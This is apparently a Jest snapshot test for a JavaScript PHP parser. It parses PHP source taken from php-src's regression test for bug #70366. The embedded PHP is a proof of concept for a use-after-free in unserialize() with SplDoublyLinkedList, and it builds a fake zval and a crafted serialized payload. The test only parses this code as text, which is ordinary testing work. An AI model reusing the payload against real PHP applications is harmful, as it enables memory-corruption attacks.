// eslint-disable prettier/prettier
const parser = require("../main");

describe("php-src tests", function () {
  // ext/spl/tests/bug70366.phpt
  it("SPL: Bug #70366 use-after-free vulnerability in unserialize() with SplDoublyLinkedList", function () {
    expect(parser.parseCode("<?php\nclass obj {\n    var $ryat;\n    function __wakeup() {\n        $this->ryat = 1;\n    }\n}\n$fakezval = ptr2str(1122334455);\n$fakezval .= ptr2str(0);\n$fakezval .= \"\\x00\\x00\\x00\\x00\";\n$fakezval .= \"\\x01\";\n$fakezval .= \"\\x00\";\n$fakezval .= \"\\x00\\x00\";\n$inner = 'i:1234;:i:1;';\n$exploit = 'a:5:{i:0;i:1;i:1;C:19:\"SplDoublyLinkedList\":'.strlen($inner).':{'.$inner.'}i:2;O:3:\"obj\":1:{s:4:\"ryat\";R:3;}i:3;a:1:{i:0;R:5;}i:4;s:'.strlen($fakezval).':\"'.$fakezval.'\";}';\n$data = unserialize($exploit);\nvar_dump($data);\nfunction ptr2str($ptr)\n{\n    $out = '';\n    for ($i = 0; $i < 8; $i++) {\n        $out .= chr($ptr & 0xff);\n        $ptr >>= 8;\n    }\n    return $out;\n}\n?>")).toMatchSnapshot();
  });
});
